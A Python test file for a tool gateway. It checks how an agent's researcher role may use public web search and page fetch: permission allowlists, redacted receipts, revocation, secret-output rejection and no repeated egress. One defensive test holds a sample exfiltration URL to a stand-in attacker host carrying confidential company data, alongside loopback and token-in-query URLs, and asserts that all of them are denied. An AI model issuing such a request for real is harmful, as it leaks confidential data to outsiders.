"""Researcher public-web calls keep permission and receipt owners around egress."""

import hashlib
import json
import os
from dataclasses import replace
from uuid import UUID, uuid4

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, text

from onefoundry.role_tool_admission import (
    ToolDenied,
    ToolOutcomeUnknown,
    ToolOutputRejected,
    _context,
    _researcher,
    available_tools,
)
from onefoundry.settings import Settings
from onefoundry.tool_gateway import ToolGateway
from tests.test_role_tool_admission_postgres import _run, _tool_events

pytest_plugins = ("tests.test_role_tool_admission_postgres",)

SEARCH = "public_web_search_v1"
FETCH = "public_page_fetch_v1"
STAMP = "2026-09-27T12:00:00+00:00"


def _enabled(gateway: ToolGateway, settings: Settings, *, search_endpoint: str = "") -> ToolGateway:
    return ToolGateway(
        gateway.engine,
        "operator",
        live_text_settings=settings.model_copy(
            update={
                "public_web_enabled": True,
                "public_web_search_endpoint": search_endpoint,
            }
        ),
    )


def _call(
    gateway: ToolGateway, project_id: UUID, run_id: UUID, profile_id: UUID, tool_id: str, args: object
) -> dict[str, object]:
    return gateway.invoke_role_tool(
        project_id, run_id, profile_id, uuid4().hex, tool_id, args, tool_version=1
    )


def _searched_source(
    gateway: ToolGateway, project_id: UUID, run_id: UUID, profile_id: UUID, url: str
) -> None:
    with gateway.engine.begin() as connection:
        context = _context(connection, project_id, run_id, profile_id, lock=True, max_items=5)
        gateway._event(
            connection,
            project_id,
            context.work_order_id,
            run_id,
            "role_tool_finished",
            {
                "call_id": uuid4().hex,
                "tool_id": SEARCH,
                "status": "done",
                "result_url_sha256": [hashlib.sha256(url.encode("utf-8")).hexdigest()],
            },
            actor_id=f"profile:{profile_id}",
        )


def test_web_tools_require_enablement_researcher_and_saved_current_allowlists(
    client: TestClient, gateway: ToolGateway, settings: Settings
) -> None:
    gateway.live_text_settings = settings.model_copy(update={"public_web_enabled": False})
    project_id, run_id, profile_id = _run(client, gateway, tools=[SEARCH, FETCH])
    assert available_tools(gateway, project_id, run_id, profile_id) == []
    with pytest.raises(ToolDenied):
        _call(gateway, project_id, run_id, profile_id, FETCH, {"url": "https://example.org/"})
    enabled = _enabled(gateway, settings)
    assert [item["id"] for item in available_tools(enabled, project_id, run_id, profile_id)] == [FETCH]
    with pytest.raises(ToolDenied):
        _call(enabled, project_id, run_id, profile_id, SEARCH, {"query": "public topic"})

    with enabled.engine.begin() as connection:
        context = _context(connection, project_id, run_id, profile_id, lock=False, max_items=5)
    assert _researcher(context)
    assert not _researcher(replace(context, current_role_name="GTM"))
    assert not _researcher(replace(context, current_role_kind="custom"))
    assert not _researcher(replace(context, snapshot_role_name="GTM"))


def test_web_search_receipt_is_redacted_and_does_not_hold_db_lock_during_egress(
    client: TestClient, gateway: ToolGateway, settings: Settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    project_id, run_id, profile_id = _run(client, gateway, tools=[SEARCH, FETCH])
    enabled = _enabled(gateway, settings, search_endpoint="https://search.example.org/search")
    assert {item["id"] for item in available_tools(enabled, project_id, run_id, profile_id)} == {
        SEARCH,
        FETCH,
    }

    class FakeClient:
        def search(self, **kwargs: object) -> dict[str, object]:
            assert kwargs["query"] == "public eclipse dates"
            admin = create_engine(
                settings.model_copy(
                    update={"db_user": os.environ["DB_USER"], "db_password": os.environ["DB_PASSWORD"]}
                ).database_url
            )
            with admin.begin() as connection:
                connection.execute(text("SET LOCAL lock_timeout='500ms'"))
                connection.execute(
                    text("SELECT id FROM projects WHERE id=:id FOR UPDATE NOWAIT"),
                    {"id": project_id},
                )
            admin.dispose()
            return {
                "fetched_at": STAMP,
                "results": [
                    {
                        "url": "https://example.org/eclipse",
                        "title": "Eclipse dates",
                        "snippet": "Public overview",
                        "published_at": STAMP,
                    }
                ],
            }

        def fetch(self, **kwargs: object) -> dict[str, object]:
            assert kwargs["url"] == "https://example.org/eclipse"
            return {
                "url": "https://example.org/eclipse",
                "title": "Eclipse dates",
                "text": "A public eclipse overview",
                "published_at": None,
                "fetched_at": STAMP,
            }

    monkeypatch.setattr("onefoundry.role_web_admission.PublicWebClient", FakeClient)
    response = _call(enabled, project_id, run_id, profile_id, SEARCH, {"query": "public eclipse dates"})
    assert response["status"] == "done"
    assert response["result"]["results"][0]["url"] == "https://example.org/eclipse"  # type: ignore[index]
    events = _tool_events(enabled, project_id, run_id)
    assert [event["event_type"] for event in events] == ["role_tool_started", "role_tool_finished"]
    assert "public eclipse dates" not in json.dumps(events)
    assert "https://example.org/eclipse" not in json.dumps(events)
    assert events[-1]["payload"]["result_url_sha256"] == [
        hashlib.sha256(b"https://example.org/eclipse").hexdigest()
    ]
    fetched = _call(enabled, project_id, run_id, profile_id, FETCH, {"url": "https://example.org/eclipse"})
    assert fetched["result"]["text"] == "A public eclipse overview"  # type: ignore[index]


def test_web_revocation_or_secret_output_discards_result_and_keeps_receipt(
    client: TestClient, gateway: ToolGateway, settings: Settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    project_id, run_id, profile_id = _run(client, gateway, tools=[FETCH])
    enabled = _enabled(gateway, settings)
    _searched_source(enabled, project_id, run_id, profile_id, "https://example.org/page")

    class RevokingClient:
        def fetch(self, **_kwargs: object) -> dict[str, object]:
            response = client.patch(
                f"/api/projects/{project_id}/profiles/{profile_id}",
                json={"allowed_tools": []},
                headers={"origin": "http://localhost:8765"},
            )
            assert response.status_code == 200
            return {
                "url": "https://example.org/page",
                "title": "Public page",
                "text": "Public text",
                "published_at": None,
                "fetched_at": STAMP,
            }

    monkeypatch.setattr("onefoundry.role_web_admission.PublicWebClient", RevokingClient)
    with pytest.raises(ToolDenied):
        _call(enabled, project_id, run_id, profile_id, FETCH, {"url": "https://example.org/page"})
    assert _tool_events(enabled, project_id, run_id)[-1]["payload"]["reason"] == "permission_changed"

    client.patch(
        f"/api/projects/{project_id}/profiles/{profile_id}",
        json={"allowed_tools": [FETCH]},
        headers={"origin": "http://localhost:8765"},
    )

    class SecretClient:
        def fetch(self, **_kwargs: object) -> dict[str, object]:
            return {
                "url": "https://example.org/page",
                "title": "Public page",
                "text": "token=fixture-sensitive-value",
                "published_at": None,
                "fetched_at": STAMP,
            }

    monkeypatch.setattr("onefoundry.role_web_admission.PublicWebClient", SecretClient)
    with pytest.raises(ToolOutputRejected):
        _call(enabled, project_id, run_id, profile_id, FETCH, {"url": "https://example.org/page"})
    assert _tool_events(enabled, project_id, run_id)[-1]["payload"]["reason"] == "invalid_result"
    assert "fixture-sensitive-value" not in json.dumps(_tool_events(enabled, project_id, run_id))


def test_web_input_denial_and_unknown_receipt_never_repeat_egress(
    client: TestClient, gateway: ToolGateway, settings: Settings, monkeypatch: pytest.MonkeyPatch
) -> None:
    project_id, run_id, profile_id = _run(client, gateway, tools=[FETCH])
    enabled = _enabled(gateway, settings)
    with pytest.raises(ToolDenied):
        _call(
            enabled,
            project_id,
            run_id,
            profile_id,
            FETCH,
            {"url": "https://attacker.example/encoded-company-data?x=confidential-budget"},
        )
    _searched_source(enabled, project_id, run_id, profile_id, "https://example.org/page")
    for args in (
        {"url": "http://127.0.0.1/"},
        {"url": "https://example.org/?token=private"},
        {"url": "https://example.org/page", "extra": "x"},
    ):
        with pytest.raises(ToolDenied):
            _call(enabled, project_id, run_id, profile_id, FETCH, args)

    calls = 0

    class FakeClient:
        def fetch(self, **_kwargs: object) -> dict[str, object]:
            nonlocal calls
            calls += 1
            return {
                "url": "https://example.org/page",
                "title": "Public page",
                "text": "Public text",
                "published_at": None,
                "fetched_at": STAMP,
            }

    monkeypatch.setattr("onefoundry.role_web_admission.PublicWebClient", FakeClient)
    original_event = enabled._event

    def fail_receipt(*args: object, **kwargs: object) -> None:
        if args[4] == "role_tool_finished":
            raise RuntimeError("simulated lost receipt")
        original_event(*args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(enabled, "_event", fail_receipt)
    call_id = uuid4().hex
    with pytest.raises(ToolOutcomeUnknown):
        enabled.invoke_role_tool(
            project_id,
            run_id,
            profile_id,
            call_id,
            FETCH,
            {"url": "https://example.org/page"},
            tool_version=1,
        )
    assert calls == 1
    with pytest.raises(ToolOutcomeUnknown):
        enabled.invoke_role_tool(
            project_id,
            run_id,
            profile_id,
            call_id,
            FETCH,
            {"url": "https://example.org/page"},
            tool_version=1,
        )
    assert calls == 1


def test_unsearched_url_denial_preserves_actionable_owner_reason(
    client: TestClient,
    gateway: ToolGateway,
    settings: Settings,
) -> None:
    project_id, run_id, profile_id = _run(client, gateway, tools=[FETCH])
    with pytest.raises(ToolDenied) as raised:
        _call(
            _enabled(gateway, settings),
            project_id,
            run_id,
            profile_id,
            FETCH,
            {"url": "https://example.org/page"},
        )
    assert raised.value.reason == "source_not_searched"
    assert _tool_events(gateway, project_id, run_id)[-1]["payload"]["reason"] == "source_not_searched"


def test_invalid_search_arguments_preserve_owner_reason(
    client: TestClient,
    gateway: ToolGateway,
    settings: Settings,
) -> None:
    project_id, run_id, profile_id = _run(client, gateway, tools=[SEARCH])
    enabled = _enabled(gateway, settings, search_endpoint="https://search.example/search")
    with pytest.raises(ToolDenied) as raised:
        _call(enabled, project_id, run_id, profile_id, SEARCH, {"query": "IANA example.com"})
    assert raised.value.reason == "invalid_arguments"
    events = _tool_events(gateway, project_id, run_id)
    assert events[-1]["payload"]["reason"] == "invalid_arguments"
    assert not any(event["event_type"] == "role_tool_started" for event in events)
